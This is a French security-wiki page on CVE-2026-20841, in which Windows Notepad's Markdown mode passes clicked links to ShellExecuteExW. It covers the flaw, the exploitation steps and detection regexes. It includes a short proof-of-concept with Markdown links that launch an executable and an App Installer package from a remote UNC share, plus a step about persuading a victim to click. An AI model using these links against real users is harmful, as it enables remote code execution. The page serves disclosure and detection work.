# Abuse de Windows Protocol Handler / ShellExecute (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Les applications Windows modernes qui rendent du Markdown/HTML transforment souvent les liens fournis par l’utilisateur en éléments cliquables et les transmettent à `ShellExecuteExW`. En l’absence d’une allowlist stricte des schemes, n’importe quel protocol handler enregistré (par exemple `file:`, `ms-appinstaller:`) peut être déclenché, ce qui peut entraîner une exécution de code dans le contexte de l’utilisateur actuel.<sup>[[1]](#references)</sup>

## Surface de ShellExecuteExW dans le mode Markdown de Windows Notepad
- Notepad choisit le mode Markdown **uniquement pour les extensions `.md`** via une comparaison de chaînes fixe dans `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Liens Markdown pris en charge :
- Standard : `[text](target)`
- Autolink : `<target>` (rendu comme `[target](target)`), les deux syntaxes sont donc importantes pour les payloads et les détections.
- Les clics sur les liens sont traités dans `sub_140170F60()`, qui effectue un filtrage faible, puis appelle `ShellExecuteExW`.
- `ShellExecuteExW` distribue vers **n’importe quel protocol handler configuré**, et pas uniquement HTTP(S).<sup>[[1]](#references)</sup>

### Considérations relatives au payload
- Toute séquence `\\` dans le lien est **normalisée en `\`** avant l’appel à `ShellExecuteExW`, ce qui affecte la création et la détection des chemins UNC.
- Les fichiers `.md` **ne sont pas associés à Notepad par défaut** ; la victime doit toujours ouvrir le fichier dans Notepad et cliquer sur le lien, mais une fois rendu, le lien est cliquable.
- Exemples de schemes dangereux :<sup>[[1]](#references)</sup>
- `file://` pour lancer un payload local/UNC.
- `ms-appinstaller://` pour déclencher les flux App Installer. D’autres schemes enregistrés localement peuvent également être exploitables.

### PoC Markdown minimal
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Flux d'exploitation
1. Créez un fichier **`.md`** afin que Notepad l'affiche comme du Markdown.
2. Intégrez un lien utilisant un schéma URI dangereux (`file:`, `ms-appinstaller:` ou tout autre handler installé).
3. Distribuez le fichier (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB ou similaire) et convainquez l'utilisateur de l'ouvrir dans Notepad.
4. Lors du clic, le **lien normalisé** est transmis à `ShellExecuteExW` et le handler de protocole correspondant exécute le contenu référencé dans le contexte de l'utilisateur.<sup>[[1]](#references)[[2]](#references)</sup>

## Idées de détection
- Surveillez les transferts de fichiers `.md` via les ports/protocoles qui servent couramment à distribuer des documents : `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analysez les liens Markdown (standard et autolink) et recherchez `file:` ou `ms-appinstaller:` **sans tenir compte de la casse**.
- Regex fournies par les vendors pour détecter l'accès aux ressources distantes :
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Le comportement du patch autoriserait uniquement les **fichiers locaux et HTTP(S)** ; tout ce qui atteint `ShellExecuteExW` est suspect. Étendez les détections à d’autres gestionnaires de protocoles installés si nécessaire, car la surface d’attaque varie selon le système.<sup>[[1]](#references)</sup>

## Références
- [1] [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
